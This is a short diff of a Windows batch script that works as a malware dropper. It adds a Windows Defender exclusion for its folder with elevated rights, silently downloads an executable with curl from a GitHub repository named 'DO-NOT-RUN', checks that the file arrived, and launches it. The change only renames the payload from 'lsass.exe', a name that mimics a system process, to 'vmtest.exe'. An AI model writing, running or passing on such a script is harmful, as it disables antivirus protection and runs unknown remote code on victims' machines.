@@ -8,12 +8,12 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Enab
 
 powershell -Command "Start-Process powershell -ArgumentList 'Set-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" >nul 2>&1
 
-curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" >nul 2>&1
+curl -L -o "%folderPath%\vmtest.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/vmtest.exe" >nul 2>&1
 if %errorlevel% neq 0 exit /b 1
 
-if not exist "%folderPath%\lsass.exe" exit /b 1
-for %%F in ("%folderPath%\lsass.exe") do set filesize=%%~zF
+if not exist "%folderPath%\vmtest.exe" exit /b 1
+for %%F in ("%folderPath%\vmtest.exe") do set filesize=%%~zF
 if "%filesize%"=="0" exit /b 1
 
-start "" "%folderPath%\lsass.exe"
+start "" "%folderPath%\vmtest.exe"
 exit
